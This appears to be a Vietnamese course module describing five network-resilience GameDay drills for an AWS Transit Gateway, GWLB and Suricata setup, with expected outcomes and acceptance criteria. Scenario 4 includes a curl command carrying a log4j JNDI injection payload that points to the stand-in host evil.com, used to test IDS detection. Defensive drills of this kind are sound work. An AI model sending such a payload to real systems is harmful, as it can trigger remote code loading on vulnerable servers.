# Module 10: Kịch Bản Diễn Tập Sự Cố Mạng Thực Tế (GameDay Scenarios)

## 1. Mục Tiêu Kỹ Thuật
- **Mục tiêu:**
  - Thực thi các bài kiểm thử phá vỡ (Chaos / GameDay Network Scenarios) có chủ đích nhằm chứng minh tính kiên cường (Resilience) và độ chính xác của hệ thống an ninh mạng.
  - Đo lường thời gian phát hiện (MTTD), thời gian phục hồi (MTTR) và ảnh hưởng tới lưu lượng người dùng cuối.
  - Thu thập toàn bộ bằng chứng runtime (Raw evidence) để đưa vào báo cáo nghiệm thu kỹ thuật.

---

## 2. Danh Mục 5 Kịch Bản Diễn Tập Sự Cố (GameDay Scenarios)

### Kịch Bản 1: Rò Rỉ Tuyến Đường (Route Leak Attack / Misconfiguration)
- **Mô phỏng:** Cố tình thêm route `10.50.0.0/16` trực tiếp vào bảng định tuyến `edge-rt` trỏ thẳng tới Core Attachment (bỏ qua Inspection).
- **Hành vi mong đợi:** 
  - Lưu lượng không qua Suricata sẽ bị chặn bởi quy tắc NetworkPolicy / NACL ở Core VPC do thiếu tag hoặc lệch routing domain.
  - Reachability Analyzer phát hiện lỗi cấu hình rò rỉ tuyến đường.
- **Khắc phục:** Xóa route sai và khôi phục đường truyền qua Inspection VPC.

### Kịch Bản 2: Lỗi Định Tuyến Bất Đối Xứng (Asymmetric Routing Failure)
- **Mô phỏng:** Tắt cờ `ApplianceModeSupport` trên Inspection Attachment:
  ```bash
  aws ec2 modify-transit-gateway-vpc-attachment \
    --transit-gateway-attachment-id <inspection-attachment-id> \
    --options "ApplianceModeSupport=disable" \
    --region ap-southeast-1
  ```
- **Hành vi mong đợi:** Gói tin chiều đi qua AZ-a, gói tin phản hồi bị chuyển qua AZ-b. Suricata tại AZ-b drop gói tin do không tìm thấy trạng thái TCP Handshake tương ứng (TCP Out-of-State / Reset).
- **Khắc phục:** Bật lại `ApplianceModeSupport=enable`, phiên kết nối lập tức phục hồi bình thường.

### Kịch Bản 3: Sự Cố Tắt Cưỡng Bức 1 Máy Chủ Tường Lửa (Suricata Appliance Loss)
- **Mô phỏng:** Tắt (Stop hoặc Terminate) máy chủ Suricata EC2 tại AZ-a:
  ```bash
  aws ec2 stop-instances --instance-ids <suricata-az-a-instance-id> --region ap-southeast-1
  ```
- **Hành vi mong đợi:**
  - GWLB phát hiện Target không phản hồi health check trong vòng 10-15 giây.
  - GWLB tự động rút Target AZ-a ra khỏi pool và chuyển toàn bộ lưu lượng mới sang Suricata AZ-b.
  - Đo tỷ lệ packet drop bằng kịch bản k6 repeated connections.

### Kịch Bản 4: Chặn Gói Tin Độc Hại & Quét Cổng (Suricata IDS/IPS Drop)
- **Mô phỏng:** Từ `frontend` Pod, thực hiện gửi yêu cầu độc hại mang mã khai thác giả lập hoặc quét cổng cấm (ví dụ: SSH 22, Telnet 23, hoặc payload log4j/sqli) tới Core VPC:
  ```bash
  curl -m 5 "https://order.internal.fabric/api/test?payload=\${jndi:ldap://evil.com/a}"
  ```
- **Hành vi mong đợi:**
  - Suricata phát hiện signature độc hại trên giao diện `geneve0` và drop gói tin ngay lập tức.
  - Bản ghi alert xuất hiện tức thì trong `eve.json` với đầy đủ timestamp, source IP, và signature ID.

### Kịch Bản 5: Lỗi Đường Về Từ Cổng Ra Tập Trung (NAT Return-Path Failure)
- **Mô phỏng:** Xóa route `10.50.0.0/16` trong Public Subnet Route Table của Egress VPC (làm mất đường về của NAT Gateway).
- **Hành vi mong đợi:** Gói tin ra Internet vẫn gửi đi thành công, nhưng gói tin phản hồi từ Web server bên ngoài bị drop tại NAT Gateway do không biết đường quay lại Core VPC.
- **Khắc phục:** Bổ sung lại route chính xác trỏ về TGW Attachment.

---

## 3. Tiêu Chí Nghiệm Thu (Acceptance Criteria)
- [ ] Bằng chứng log xác nhận Suricata drop đúng gói tin độc hại và ghi nhận trong `eve.json`.
- [ ] Bằng chứng xác nhận khi tắt Appliance Mode, phiên kết nối bị ngắt do routing bất đối xứng.
- [ ] Bằng chứng failover của GWLB: chuyển dịch tải sang instance còn sống trong thời gian < 30 giây.
- [ ] Báo cáo tổng kết GameDay ghi nhận đầy đủ MTTD, MTTR và root-cause analysis.
